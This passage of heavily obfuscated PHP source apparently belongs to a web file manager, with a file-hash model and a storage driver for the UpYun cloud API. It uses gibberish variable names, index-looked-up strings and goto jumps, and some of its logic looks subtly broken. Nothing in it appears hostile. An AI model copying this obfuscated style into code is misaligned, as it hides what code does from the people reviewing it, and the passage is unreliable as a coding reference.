$this->where($Õı©Ôäİ)->setAdd($Š²™æª[2052], $ÖşÛâƒû); } } public function findByHash($ø”¨Ò…, $¸÷Ûí‘¿ = false) { $¯ôÑõ— =& $_SERVER[†ûãı«°]; if (!$ø”¨Ò… && !$¸÷Ûí‘¿) { return !1; } $”«„èé = array($¯ôÑõ—[2046] => $ø”¨Ò…); if ($¸÷Ûí‘¿) { $”«„èé = array($¯ôÑõ—[2047] => $¸÷Ûí‘¿); } return $this->order($¯ôÑõ—[2053])->where($”«„èé)->find(); } public function clearEmpty($Îãá´“ˆ = 1) { $¹ÕØÊù½ =& $_SERVER[†ûãı«°]; $Ú Å§› = time() - 3600 * 24 * $Îãá´“ˆ; $îÌ¸®ì¹ = $¹ÕØÊù½[2054] . $Ú Å§›; $ä¦ˆ™Ÿ = $this->where($îÌ¸®ì¹)->select(); if (!$ä¦ˆ™Ÿ) { return; } $à†¡­ïÆ = new Task($¹ÕØÊù½[2055], $¹ÕØÊù½[12], count($ä¦ˆ™Ÿ)); foreach ($ä¦ˆ™Ÿ as $¿Š•õ·®) { $à†¡­ïÆ->update(1); $this->resetFile($¿Š•õ·®); } $à†¡­ïÆ->end(); } public function resetFile($”ÛÈÈå) { $¢êÇŠÄ =& $_SERVER[†ûãı«°]; $á‚–¶ = array($¢êÇŠÄ[546] => $”ÛÈÈå[$¢êÇŠÄ[545]]); $ä›±…© = Model($¢êÇŠÄ[1432])->where($á‚–¶)->count(); $³Ú°òÊ¸ = Model($¢êÇŠÄ[2056])->where($á‚–¶)->count(); $İß––Ö = intval($ä›±…©) + intval($³Ú°òÊ¸); if ($İß––Ö == 0) { IO::remove($”ÛÈÈå[$¢êÇŠÄ[87]]); Model($¢êÇŠÄ[2057])->delete($”ÛÈÈå[$¢êÇŠÄ[545]]); $this->where($á‚–¶)->delete(); $this->metaSet($”ÛÈÈå[$¢êÇŠÄ[545]], null, null); write_log(ACTION . $¢êÇŠÄ[2058] . KodUser::id() . $¢êÇŠÄ[2059] . $”ÛÈÈå[$¢êÇŠÄ[545]] . $¢êÇŠÄ[2060] . $”ÛÈÈå[$¢êÇŠÄ[79]] . $¢êÇŠÄ[201] . $”ÛÈÈå[$¢êÇŠÄ[87]], $¢êÇŠÄ[2061]); return; } if ($”ÛÈÈå[$¢êÇŠÄ[2052]] != $İß––Ö) { $this->where($á‚–¶)->save(array($¢êÇŠÄ[2045] => $İß––Ö)); } } public function storageInfo($õÇÛğ•› = false) { $ìóßğµ =& $_SERVER[†ûãı«°]; $ß°ÓàÔ = $this->count() + 0.0; $ÜşùÙÒ = 0; $Èßş¼é… = 1; $”éïÏÕ‚ = 0; $Õİ©Òòæ = 5000; for ($‰¦²û¸ = 0; $‰¦²û¸ < $ß°ÓàÔ; $‰¦²û¸ = $‰¦²û¸ + $Õİ©Òòæ) { $µ•Ÿ´¦ = $this->limit($‰¦²û¸, $‰¦²û¸ + $Õİ©Òòæ)->select(); foreach ($µ•Ÿ´¦ as $æÍ¥ØÏÑ) { $Èßş¼é… += $æÍ¥ØÏÑ[$ìóßğµ[79]] * $æÍ¥ØÏÑ[$ìóßğµ[2052]]; $ÜşùÙÒ += $æÍ¥ØÏÑ[$ìóßğµ[79]] * ($æÍ¥ØÏÑ[$ìóßğµ[2052]] - 1); $”éïÏÕ‚ += $æÍ¥ØÏÑ[$ìóßğµ[2052]]; } } $‚İšÔ’£ = array($ìóßğµ[2062] => $Èßş¼é…, $ìóßğµ[2063] => $ÜşùÙÒ, $ìóßğµ[2064] => $ÜşùÙÒ / $Èßş¼é…, $ìóßğµ[83] => $ß°ÓàÔ, $ìóßğµ[2065] => $”éïÏÕ‚); return $‚İšÔ’£; } } goto EŠìÄàßÙ£; eøˆƒÄÃŸ•: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÂÁ•¶¤², $ùØùÛú = 0) { parent::__construct(); $this->source = $ÂÁ•¶¤²; $this->sourceSize = $ùØùÛú; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($òŒ¦°¡­ = false) { return $this->sourceSize; } public function getContent($Ëô˜şî = false) { return $this->fileSubstr($Ëô˜şî, 0, $this->sourceSize); } public function fileSubstr($å§Å¨Ş‹ = false, $Ÿ»êÃÇ = 0, $¡·²ƒ„ = 0) { if (!$¡·²ƒ„) { $¡·²ƒ„ = $this->sourceSize; } $Á¿éó¡ë = $this->sourceSize - $Ÿ»êÃÇ; if ($¡·²ƒ„ >= $Á¿éó¡ë) { $¡·²ƒ„ = $Á¿éó¡ë; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ÿ»êÃÇ, $¡·²ƒ„); } if ($this->sourceType == self::TYPE_FILE) { if ($¡·²ƒ„ <= 0) { return $_SERVER[†ûãı«°][12]; } $ÕÕÒ ı÷ = ftell($this->source); fseek_64($this->source, $ÕÕÒ ı÷ + $Ÿ»êÃÇ); $¯©áÖ†Ø = @fread($this->source, $¡·²ƒ„); fseek_64($this->source, $ÕÕÒ ı÷); return $¯©áÖ†Ø; } } public function hashMd5($ÊŒ°•â = false) { return md5($this->getContent()); } public static function hash($™¿·Ûõ¤, $Øí ™æË = 0) { $™³¹Áâ‘ = new PathDriverStream($™¿·Ûõ¤, $Øí ™æË); return $™³¹Áâ‘->hashSimple($™¿·Ûõ¤); } public static function md5($±Â©ãÖ®, $ˆÆé© = 0) { $›§è¡Ä¥ = new PathDriverStream($±Â©ãÖ®, $ˆÆé©); return $›§è¡Ä¥->hashMd5($±Â©ãÖ®); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\x3a\x2f\57\166\60\x2e\141\x70\151\x2e\165\160\171\165\156\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($©¿ó‰”ö) { parent::__construct(); $this->_init($©¿ó‰”ö); } public function _init($ê×Ë©ù­) { $œ˜Éı­Œ =& $_SERVER[†ûãı«°]; foreach ($ê×Ë©ù­ as $Š¢ç‘• => $ó³ÛîÜ…) { if (isset($this->{$Š¢ç‘•})) { $this->{$Š¢ç‘•} = $ó³ÛîÜ…; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($œ˜Éı­Œ[1557] . LNG($œ˜Éı­Œ[1476])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($‡©´À¡§, $Ö•Øœ í = "\107\105\124") { $âÃº˜òä =& $_SERVER[†ûãı«°]; $­àÏ¸·Ê = gmdate($âÃº˜òä[1505]); $ø­ÕŞ´è = base64_encode(hash_hmac($âÃº˜òä[1558], "{$Ö•Øœ í}\46{$‡©´À¡§}\x26{$­àÏ¸·Ê}", md5("{$this->userpass}"), !0)); $²íÕ¢¹× = array("\x41\x75\164\150\157\162\151\x7a\x61\164\151\157\156\x3a\125\x50\x59\125\x4e\40{$this->username}\x3a{$ø­ÕŞ´è}", "\104\x61\164\x65\x3a{$­àÏ¸·Ê}"); return $²íÕ¢¹×; } public function ussRequest($ğğ–»ÌÓ, $‡›ôØÀ‰ = "\x47\x45\x54", $Ä¢“º„¸ = false, $ŒµÖÓüÊ = false, $±Æ‡İÒü = false) { $‚õŒ¶­ =& $_SERVER[†ûãı«°]; $ğğ–»ÌÓ = trim($ğğ–»ÌÓ, $‚õŒ¶­[8]); $ãßãœóÌ = "\57{$this->bucket}\57" . rawurlencode($ğğ–»ÌÓ); $÷ÒÛëÒ¼ = $this->ussHeaders($ãßãœóÌ, $‡›ôØÀ‰); if ($ŒµÖÓüÊ) { $÷ÒÛëÒ¼ = array_merge($÷ÒÛëÒ¼, $ŒµÖÓüÊ); } $íâêÑì€ = url_request($this->endpoint . $ãßãœóÌ, $‡›ôØÀ‰, $Ä¢“º„¸, $÷ÒÛëÒ¼, $±Æ‡İÒü); if (!$íâêÑì€) { $ÍêÙùÑ× = LNG($‚õŒ¶­[1559]); $this->writeLog($ÍêÙùÑ×); return array($‚õŒ¶­[1308] => !1, $‚õŒ¶­[1298] => $ÍêÙùÑ×); } if (strtolower($‡›ôØÀ‰) == $‚õŒ¶­[229] || in_array($íâêÑì€[$‚õŒ¶­[1308]], array($‚õŒ¶­[263], $‚õŒ¶­[1560]))) { $Ä¢“º„¸ = $íâêÑì€[$‚õŒ¶­[1561]]; if (!$íâêÑì€[$‚õŒ¶­[826]]) { $Ä¢“º„¸ = isset($Ä¢“º„¸[0]) ? $Ä¢“º„¸[0] : $‚õŒ¶­[12]; } } else { $Ä¢“º„¸ = json_decode($íâêÑì€[$‚õŒ¶­[1298]], !0); if (!$Ä¢“º„¸) { $Ä¢“º„¸ = $íâêÑì€[$‚õŒ¶­[1298]]; } else { if (!$íâêÑì€[$‚õŒ¶­[826]] && isset($Ä¢“º„¸[$‚õŒ¶­[1562]])) { $Ä¢“º„¸ = $Ä¢“º„¸[$‚õŒ¶­[1562]]; } } } if (!$íâêÑì€[$‚õŒ¶­[826]]) { $this->writeLog($this->__errorMessage($Ä¢“º„¸)); } return array($‚õŒ¶­[1308] => $íâêÑì€[$‚õŒ¶­[826]], $‚õŒ¶­[1298] => $Ä¢“º„¸); } private function __errorMessage($şÓšô„²) { $ÀÑìé† =& $_SERVER[†ûãı«°]; if (!$şÓšô„²) { return $ÀÑìé†[12]; } static $ğäÊ¸áÆ = null; if (!$ğäÊ¸áÆ) { $ğäÊ¸áÆ = I18n::getType(); } if ($ğäÊ¸áÆ != $ÀÑìé†[1515]) { return $şÓšô„²; } $Øª†êİÖ = array($ÀÑìé†[1563] => $ÀÑìé†[1564], $ÀÑìé†[1565] => $ÀÑìé†[1566], $ÀÑìé†[1567] => $ÀÑìé†[1566], $ÀÑìé†[1568] => $ÀÑìé†[1569], $ÀÑìé†[1570] => $ÀÑìé†[1571], $ÀÑìé†[1572] => $ÀÑìé†[1573], $ÀÑìé†[1574] => $ÀÑìé†[1575]); return isset($Øª†êİÖ[$şÓšô„²]) ? $Øª†êİÖ[$şÓšô„²] : $şÓšô„²; } public function mkfile($‘¯Áùİ³, $û¯­Öˆì = '', $ÏÖ¼€‰Ô = REPEAT_RENAME) { if ($this->setContent($‘¯Áùİ³, $û¯­Öˆì)) { return $this->getPathOuter($‘¯Áùİ³); } return !1; } public function mkdir($“­¿÷«, $Ñ¤ŠËã„ = REPEAT_SKIP) { $êõÅ¿‚ =& $_SERVER[†ûãı«°]; $™ËÙÊÓï = trim($“­¿÷«, $êõÅ¿‚[8]); if ($this->_isFolder($™ËÙÊÓï)) { return $this->getPathOuter($™ËÙÊÓï); } $–‡ª³Ñú = array($êõÅ¿‚[1576]); $È»æ² = $this->ussRequest($™ËÙÊÓï, $êõÅ¿‚[290], !1, $–‡ª³Ñú); return $È»æ²[$êõÅ¿‚[1308]] ? $this->getPathOuter($™ËÙÊÓï) : !1; } public function copyFile($õ«¿Œ™û, $¨”§¹…) { $Ç„­Ç¨® =& $_SERVER[†ûãı«°]; $¹Õ¸çš‡ = array($Ç„­Ç¨®[1577] . "\57{$this->bucket}\x2f{$õ«¿Œ™û}", $Ç„­Ç¨®[1578]); $€£İ¼Š’ = $this->ussRequest($¨”§¹…, $Ç„­Ç¨®[255], !1, $¹Õ¸çš‡); return $€£İ¼Š’[$Ç„­Ç¨®[1308]] ? !0 : $this->getPathOuter($¨”§¹…); } public function moveFile($ÊÑ´½ğ¥, $‰šñğç) { $Êš—™‚ =& $_SERVER[†ûãı«°]; $‘îå•½Ã = array($Êš—™‚[1579] . "\57{$this->bucket}\57{$ÊÑ´½ğ¥}", $Êš—™‚[1578]); $–Ãèú¼ = $this->ussRequest($‰šñğç, $Êš—™‚[255], !1, $‘îå•½Ã); return $–Ãèú¼[$Êš—™‚[1308]] ? !0 : $this->getPathOuter($‰šñğç); } public function delFile($ãİÑá¡‡) { $ÛİÑÙ¹ú =& $_SERVER[†ûãı«°]; $Ğ­¨Ğ¦ = $this->ussRequest($ãİÑá¡‡, $ÛİÑÙ¹ú[1580]); return $Ğ­¨Ğ¦[$ÛİÑÙ¹ú[1308]] ? !0 : !1; } public function delFolder($œ¤ÆÚÜâ) { $½íòˆ¼İ =& $_SERVER[†ûãı«°]; if (!$this->exist($œ¤ÆÚÜâ)) { return !0; } $this->listItemCache = !1; $üÖö·û½ = $«ŒÇóØ¸ = array(); $this->fileList($œ¤ÆÚÜâ, $üÖö·û½, $«ŒÇóØ¸, !0); $this->listItemCache = !0; foreach ($«ŒÇóØ¸ as $ˆåâŒŒ„) { $é¸ ã¯¯ = $this->ussRequest($ˆåâŒŒ„[$½íòˆ¼İ[32]], $½íòˆ¼İ[1580]); if (!$é¸ ã¯¯[$½íòˆ¼İ[1308]]) { return !1; } } usort($üÖö·û½, function ($§ÇêÆ¢, $ì·š¾) { $³…ù¤Å´ =& $_SERVER[†ûãı«°]; return substr_count($ì·š¾, $³…ù¤Å´[8]) - substr_count($§ÇêÆ¢, $³…ù¤Å´[8]); }); foreach ($üÖö·û½ as $½†¼ØŸø) { $é¸ ã¯¯ = $this->ussRequest($½†¼ØŸø, $½íòˆ¼İ[1580]); if (!$é¸ ã¯¯[$½íòˆ¼İ[1308]]) { return !1; } } $é¸ ã¯¯ = $this->ussRequest($œ¤ÆÚÜâ, $½íòˆ¼İ[1580]); return $é¸ ã¯¯[$½íòˆ¼İ[1308]]; } public function rename($Ğ¤‡•¶ú, $€›Èê) { if ($this->isFile($Ğ¤‡•¶ú)) { $€›Èê = get_path_father($Ğ¤‡•¶ú) . $€›Èê; return $this->moveFile($Ğ¤‡•¶ú, $€›Èê); } return $this->renameObject($Ğ¤‡•¶ú, $€›Èê); } public function fileInfo($å‰ªâ¥·, $çê‘Ÿ¬ñ = false, $šÄÑ°áô = array()) { $ éò¥… =& $_SERVER[†ûãı«°]; $ˆîé¬Å² = array($ éò¥…[32] => $this->pathThis($å‰ªâ¥·), $ éò¥…[87] => $this->getPathOuter($ éò¥…[8] . $å‰ªâ¥·), $ éò¥…[33] => $ éò¥…[232], $ éò¥…[79] => isset($šÄÑ°áô[$ éò¥…[79]]) ? $šÄÑ°áô[$ éò¥…[79]] : 0, $ éò¥…[169] => $this->ext($å‰ªâ¥·)); if ($çê‘Ÿ¬ñ) { return $ˆîé¬Å²; } $ˆîé¬Å²[$ éò¥…[233]] = $ˆîé¬Å²[$ éò¥…[88]] = 0; $ˆîé¬Å²[$ éò¥…[234]] = $ˆîé¬Å²[$ éò¥…[235]] = !0; if (empty($šÄÑ°áô)) { $šÄÑ°áô = $this->objectMeta($å‰ªâ¥·); if (!$šÄÑ°áô) { return $ˆîé¬Å²; } } $ˆîé¬Å²[$ éò¥…[233]] = intval($šÄÑ°áô[$ éò¥…[1581]]); $ˆîé¬Å²[$ éò¥…[88]] = intval($šÄÑ°áô[$ éò¥…[1582]]); $ˆîé¬Å²[$ éò¥…[79]] = $šÄÑ°áô[$ éò¥…[79]]; return $ˆîé¬Å²; } public function folderInfo($ğµÃ€€Ö, $ëÜœŒ÷› = false) { $ôÍÔÉõç =& $_SERVER[†ûãı«°]; $ßÓßßäŞ = array($ôÍÔÉõç[32] => $this->pathThis($ğµÃ€€Ö), $ôÍÔÉõç[87] => $this->getPathOuter($ôÍÔÉõç[8] . $ğµÃ€€Ö), $ôÍÔÉõç[33] => $ôÍÔÉõç[78]); if ($ëÜœŒ÷›) { return $ßÓßßäŞ; } $ßÓßßäŞ[$ôÍÔÉõç[233]] = $ßÓßßäŞ[$ôÍÔÉõç[88]] = 0; $ßÓßßäŞ[$ôÍÔÉõç[234]] = $ßÓßßäŞ[$ôÍÔÉõç[235]] = !0; if (empty($¿ãµÈ¯è)) { $¿ãµÈ¯è = $this->objectMeta($ğµÃ€€Ö); if (!$¿ãµÈ¯è) { return $ßÓßßäŞ; } } $ßÓßßäŞ[$ôÍÔÉõç[233]] = intval($¿ãµÈ¯è[$ôÍÔÉõç[1581]]); $ßÓßßäŞ[$ôÍÔÉõç[88]] = intval($¿ãµÈ¯è[$ôÍÔÉõç[1582]]); return $ßÓßßäŞ; } private function listObjs($‘ÒÑÓÃÏ, $ßòêĞÜ  = 0, $Ê›¹³˜Ø = 1000) { $ƒÓŸÃ¡Ú =& $_SERVER[†ûãı«°]; $®õøœ ç = array($ƒÓŸÃ¡Ú[1583], $ƒÓŸÃ¡Ú[1584] . $Ê›¹³˜Ø); if ($ßòêĞÜ ) { $®õøœ ç[] = $ƒÓŸÃ¡Ú[1585] . $ßòêĞÜ ; } $•î˜˜ØŠ = $this->ussRequest($‘ÒÑÓÃÏ, $ƒÓŸÃ¡Ú[1507], !1, $®õøœ ç); return !$•î˜˜ØŠ[$ƒÓŸÃ¡Ú[1308]] ? !1 : $•î˜˜ØŠ[$ƒÓŸÃ¡Ú[1298]]; } private function fileList($úé½€÷°, &$É¤á¾„, &$˜ó­İëÑ, $ Ø‚Œ© = false) { $ºØ½Ğë  =& $_SERVER[†ûãı«°]; $ÚŒøÖÕ = $ºØ½Ğë [12]; $¼èÚèŒú = 1000; $„¸šô˜ = rtrim($úé½€÷°, $ºØ½Ğë [8]) . $ºØ½Ğë [8]; while (!0) { check_abort(); $£ˆğø†Õ = $this->listObjs($úé½€÷°, $ÚŒøÖÕ, $¼èÚèŒú); if (!$£ˆğø†Õ) { return !1; } $ÚŒøÖÕ = isset($£ˆğø†Õ[$ºØ½Ğë [1586]]) ? $£ˆğø†Õ[$ºØ½Ğë [1586]] : $ºØ½Ğë [12]; $Ê¬Á­Üæ = isset($£ˆğø†Õ[$ºØ½Ğë [1587]]) ? $£ˆğø†Õ[$ºØ½Ğë [1587]] : array(); foreach ($Ê¬Á­Üæ as $…÷ê†îº) { $îÚŠ³»ø = $…÷ê†îº[$ºØ½Ğë [33]] == $ºØ½Ğë [78] ? !0 : !1; $¤¬Œ‡“„ = ltrim($„¸šô˜ . $…÷ê†îº[$ºØ½Ğë [32]], $ºØ½Ğë [8]) . ($îÚŠ³»ø ? $ºØ½Ğë [8] : $ºØ½Ğë [12]); $‹ì¨ê¯Ş = array($ºØ½Ğë [32] => $¤¬Œ‡“„, $ºØ½Ğë [33] => $îÚŠ³»ø ? $ºØ½Ğë [78] : $ºØ½Ğë [232], $ºØ½Ğë [79] => $…÷ê†îº[$ºØ½Ğë [414]], $ºØ½Ğë [1582] => $…÷ê†îº[$ºØ½Ğë [1588]]); $this->cacheMethodInfoSet($¤¬Œ‡“„, $îÚŠ³»ø, $‹ì¨ê¯Ş); if ($îÚŠ³»ø) { $É¤á¾„[] = $¤¬Œ‡“„; if ($ Ø‚Œ©) { $this->fileList($¤¬Œ‡“„, $É¤á¾„, $˜ó­İëÑ, $ Ø‚Œ©); } continue; } $˜ó­İëÑ[] = $‹ì¨ê¯Ş; } if (count($Ê¬Á­Üæ) < $¼èÚèŒú) { break; } } $this->cacheMethodInfoSet($úé½€÷°, !0); } public function listPath($³‘ÕÖ±, $¹÷òõÜ­ = false) { $€©‘ğ†Â =& $_SERVER[†ûãı«°]; $ÜÒ—ë = $†Å¢Õ…Ì = array(); $this->fileList($³‘ÕÖ±, $ÜÒ—ë, $†Å¢Õ…Ì); foreach ($ÜÒ—ë as $ÏÉ•ç„„ => $øÌ‡Øªª) { $ÜÒ—ë[$ÏÉ•ç„„] = $this->folderInfo($øÌ‡Øªª, $¹÷òõÜ­); } foreach ($†Å¢Õ…Ì as $ÏÉ•ç„„ => $øÌ‡Øªª) { $†Å¢Õ…Ì[$ÏÉ•ç„„] = $this->fileInfo($øÌ‡Øªª[$€©‘ğ†Â[32]], $¹÷òõÜ­, $øÌ‡Øªª); } return array($€©‘ğ†Â[85] => $ÜÒ—ë, $€©‘ğ†Â[86] => $†Å¢Õ…Ì); } public function has($Áåªš‹å, $ñÊ´®ò = false, $ööƒÃ½› = true) { $Äé²ÅØ³ =& $_SERVER[†ûãı«°]; $µ§õœíÏ = $Äé²ÅØ³[12]; $é¬ı†œ¤ = 500; $Ô§Åªëñ = 0; $Œ§éŸ‰± = 0; $­’«—ëØ = rtrim($Áåªš‹å, $Äé²ÅØ³[8]) . $Äé²ÅØ³[8]; while (!0) { check_abort(); $ÒÖ¶…Ï = $this->listObjs($Áåªš‹å, $µ§õœíÏ, $é¬ı†œ¤); if (!$ÒÖ¶…Ï) { return !1; } $µ§õœíÏ = isset($ÒÖ¶…Ï[$Äé²ÅØ³[1586]]) ? $ÒÖ¶…Ï[$Äé²ÅØ³[1586]] : $Äé²ÅØ³[12]; $ÎµÙ£ëĞ = isset($ÒÖ¶…Ï[$Äé²ÅØ³[1587]]) ? $ÒÖ¶…Ï[$Äé²ÅØ³[1587]] : array(); if (empty($ÎµÙ£ëĞ)) { break; } $‡ÆĞöà = array_filter($ÎµÙ£ëĞ, function ($ş¼Çš¤) { $¸ò´éñ£ =& $_SERVER[†ûãı«°]; return $ş¼Çš¤[$¸ò´éñ£[33]] == $¸ò´éñ£[78]; }); $›åÏšôİ = count($ÎµÙ£ëĞ); $‡ÆĞöà = count($‡ÆĞöà); $ßë½éâš = $›åÏšôİ - $‡ÆĞöà; if ($ñÊ´®ò) { $Œ§éŸ‰± += $‡ÆĞöà; $Ô§Åªëñ += $ßë½éâš; if ($›åÏšôİ < $é¬ı†œ¤) { break; } continue; } if ($ööƒÃ½›) { if ($ßë½éâš) { return !0; } } else { if ($‡ÆĞöà) { return !0; } } if ($›åÏšôİ < $é¬ı†œ¤) { break; } } if ($ñÊ´®ò) { return array($Äé²ÅØ³[241] => $Ô§Åªëñ, $Äé²ÅØ³[242] => $Œ§éŸ‰±); } return !1; } public function listAll($ıÔÄ·ƒ«) { $ö÷Ä´„ =& $_SERVER[†ûãı«°]; $³ÛùÒ½Â = $Ã…¹²Ñ = array(); $this->fileList($ıÔÄ·ƒ«, $³ÛùÒ½Â, $Ã…¹²Ñ, !0); $¶Õ¼ğä = array_to_keyvalue($Ã…¹²Ñ, $ö÷Ä´„[32]); foreach ($³ÛùÒ½Â as $‹ÊÊ´Î†) { if (is_string($‹ÊÊ´Î†)) { $¶Õ¼ğä[$‹ÊÊ´Î†] = array($ö÷Ä´„[79] => 0); } } return $this->listAllFiles($ıÔÄ·ƒ«, $¶Õ¼ğä); } public function canRead($ºê¿ÏÃÒ) { return $this->exist($ºê¿ÏÃÒ) ? !0 : !1; } public function canWrite($°ˆ¡Ùµ¢) { return $this->exist($°ˆ¡Ùµ¢) ? !0 : !1; } public function getContent($Óß¸øÏÆ) { return $this->fileSubstr($Óß¸øÏÆ, 0, -1); } public function setContent($ãÌì¨“ã, $ê¢ÑÌ’È = '') { $±Òûô¹ª =& $_SERVER[†ûãı«°]; if (!$ê¢ÑÌ’È) { $ÙëªÕìô = $this->ussRequest($ãÌì¨“ã, $±Òûô¹ª[290]); return $ÙëªÕìô[$±Òûô¹ª[1308]]; } $Œ„ûª” = $this->tempFile($this->pathThis($ãÌì¨“ã)); file_put_contents($Œ„ûª”, $ê¢ÑÌ’È); if ($this->upload($ãÌì¨“ã, $Œ„ûª”)) { $this->tempFileRemve($Œ„ûª”); return !0; } return !1; } public function fileSubstr($’ı©æ©, $ø•¯—³Ó, $é£Ê¶åõ) { $ ã®Øø¸ =& $_SERVER[†ûãı«°]; if (!($ïºìŒñ³ = $this->link($’ı©æ©))) { return !1; } $¿¬ŒÙ·ˆ = !1; if ($é£Ê¶åõ > 0) { $Œ£ÄÒÖØ = $ø•¯—³Ó + $é£Ê¶åõ - 1; $¿¬ŒÙ·ˆ = array($ ã®Øø¸[1547] . $ø•¯—³Ó . $ ã®Øø¸[464] . $Œ£ÄÒÖØ); } $’ÛËÁ£ = url_request($ïºìŒñ³, $ ã®Øø¸[1507], !1, $¿¬ŒÙ·ˆ); return $’ÛËÁ£[$ ã®Øø¸[826]] ? $’ÛËÁ£[$ ã®Øø¸[1298]] : !1; } public function upload($Ë‹šãŞ, $æŞ¡Û, $ıÎ¸»œ¸ = false, $éÉ¢ç€¼ = REPEAT_REPLACE) { $·Âèä =& $_SERVER[†ûãı«°]; $®À½ÕŸç = IO::size($æŞ¡Û); if ($®À½ÕŸç <= 1024 * 1024 * 200) { $ Ô××ïÕ = array($·Âèä[1589] . $æŞ¡Û); $º³Ñî = $this->ussRequest($Ë‹šãŞ, $·Âèä[255], $ Ô××ïÕ); return $º³Ñî[$·Âèä[1308]] ? $this->getPathOuter($Ë‹šãŞ) : !1; } $¤±êËœ = 1024 * 1024 * 10; $Â«¾ê®™ = array($·Âèä[1590], $·Âèä[1591] . $®À½ÕŸç, $·Âèä[1592], $·Âèä[1593] . $¤±êËœ); $º³Ñî = $this->ussRequest($Ë‹šãŞ, $·Âèä[255], !1, $Â«¾ê®™); if (!$º³Ñî[$·Âèä[1308]]) { return !1; } $È™Æûı€ = $º³Ñî[$·Âèä[1298]]; $¨²éúŒÁ = 0; $£ıÍüå¥ = $È™Æûı€[$·Âèä[1594]]; $‚¤­Ç­‰ = fopen($æŞ¡Û, $·Âèä[1470]); if (!$‚¤­Ç­‰) { return !1; } do { $ ßˆò²² = $È™Æûı€[$·Âèä[1595]]; fseek_64($‚¤­Ç­‰, $¨²éúŒÁ); $—×Éòı² = fread($‚¤­Ç­‰, $ ßˆò²²); $Ï”èŞ• = 0; do { $Ï”èŞ•++; $È™Æûı€ = $this->uploadPart($Ë‹šãŞ, $È™Æûı€, $—×Éòı²); } while (!$È™Æûı€ && $Ï”èŞ• < 3); if (!$È™Æûı€) { return !1; } $£ıÍüå¥ = $È™Æûı€[$·Âèä[1594]]; $¨²éúŒÁ += $ ßˆò²²; } while ($£ıÍüå¥ != -1); fclose($‚¤­Ç­‰); $Â«¾ê®™ = array($·Âèä[1596], $·Âèä[1597] . $È™Æûı€[$·Âèä[1598]], $·Âèä[1592]); $º³Ñî = $this->ussRequest($Ë‹šãŞ, $·Âèä[255], !1, $Â«¾ê®™); return $º³Ñî[$·Âèä[1308]] ? $this->getPathOuter($àÂ¼¦§) : !1; } private function uploadPart($ĞÕš¥™, $Ç½É¡, &$î®Øü…) { $‘¨ØİŞœ =& $_SERVER[†ûãı«°]; $Î¤²›¡Â = array($‘¨ØİŞœ[1599], $‘¨ØİŞœ[1597] . $Ç½É¡[$‘¨ØİŞœ[1598]], $‘¨ØİŞœ[1600] . $Ç½É¡[$‘¨ØİŞœ[1594]], $‘¨ØİŞœ[146] . $Ç½É¡[$‘¨ØİŞœ[1595]]); $½‹·Ö¤¦ = $this->ussRequest($ĞÕš¥™, $‘¨ØİŞœ[255], $î®Øü…, $Î¤²›¡Â); return !$½‹·Ö¤¦[$‘¨ØİŞœ[1308]] ? $½‹·Ö¤¦[$‘¨ØİŞœ[1308]] : $½‹·Ö¤¦[$‘¨ØİŞœ[1298]]; } public function uploadFormData($¦¢èÀÂ, $ğÛ®ßõ = 3600) { return $this->uploadPolicy($¦¢èÀÂ, $ğÛ®ßõ); } public function uploadMultiData($ª˜ƒ’³›, $ ±™ÏÎ• = 3600) { $ûüÌÏË =& $_SERVER[†ûãı«°]; $ÄèöÎå = (int) $GLOBALS[$ûüÌÏË[7]][$ûüÌÏË[79]]; return $this->uploadPolicy($ª˜ƒ’³›, $ ±™ÏÎ•, $ÄèöÎå); } private function uploadPolicy($¬¤Ñà«¬, $´üšíËş = 3600, $¸éÑŸ¾¶ = 0) { $ì¢âù¼Š =& $_SERVER[†ûãı«°]; $ø†¿•³Ÿ = $ì¢âù¼Š[8] . $this->bucket; $½°’³İî = gmdate($ì¢âù¼Š[1505]); $ÊÎë¦ªæ = array($ì¢âù¼Š[1601] => $this->bucket, $ì¢âù¼Š[1602] => $¬¤Ñà«¬, $ì¢âù¼Š[1603] => time() + $´üšíËş, $ì¢âù¼Š[1604] => $½°’³İî); if ($¸éÑŸ¾¶) { $ÊÎë¦ªæ[$ì¢âù¼Š[1490]] = $¸éÑŸ¾¶; } $¹À“·ş» = base64_encode(json_encode($ÊÎë¦ªæ)); $¨Œ Ş¬¾ = base64_encode(hash_hmac($ì¢âù¼Š[1558], "\x50\117\123\x54\x26{$ø†¿•³Ÿ}\46{$½°’³İî}\x26{$¹À“·ş»}", md5("{$this->userpass}"), !0)); $Û‚ãó²½ = array($ì¢âù¼Š[279] => $¹À“·ş», $ì¢âù¼Š[1605] => "\125\x50\131\125\x4e\x20{$this->username}\72{$¨Œ Ş¬¾}", $ì¢âù¼Š[208] => $this->endpoint . $ø†¿•³Ÿ); return $Û‚ãó²½; } public function download($Á»–¬¥», $‡Üå¦è) { $Ì˜ê­‹ = IO::getPathInner(IO::mkfile($‡Üå¦è)); if (!($»È¬êŒ = $this->link($Á»–¬¥»))) { return !1; } $Óõ»¼›ñ = 0; $äè‘ùŸ‹ = 1024 * 200; $Š­ĞÄä = fopen($Ì˜ê­‹, $_SERVER[†ûãı«°][1553]); while (!0) { $şÍ™°õ¿ = $this->fileSubstr($Á»–¬¥», $Óõ»¼›ñ, $äè‘ùŸ‹); if ($şÍ™°õ¿ === !1) { return !1; } fwrite($Š­ĞÄä, $şÍ™°õ¿); $Óõ»¼›ñ += $äè‘ùŸ‹; if (strlen($şÍ™°õ¿) < $äè‘ùŸ‹) { break; } } fclose($Š­ĞÄä); return $‡Üå¦è; } public function link($ñ§¥ıÙş, $ÍŞ”õâ‘ = array()) { $¡»ç’­Ñ =& $_SERVER[†ûãı«°]; $ñ§¥ıÙş = trim($ñ§¥ıÙş, $¡»ç’­Ñ[8]); if (!empty($this->token)) { $”ç—åÎÚ = strtotime(date($¡»ç’­Ñ[1606])); $ñçäş—ı = substr(md5($this->token . $¡»ç’­Ñ[286] . $”ç—åÎÚ . $¡»ç’­Ñ[1607] . 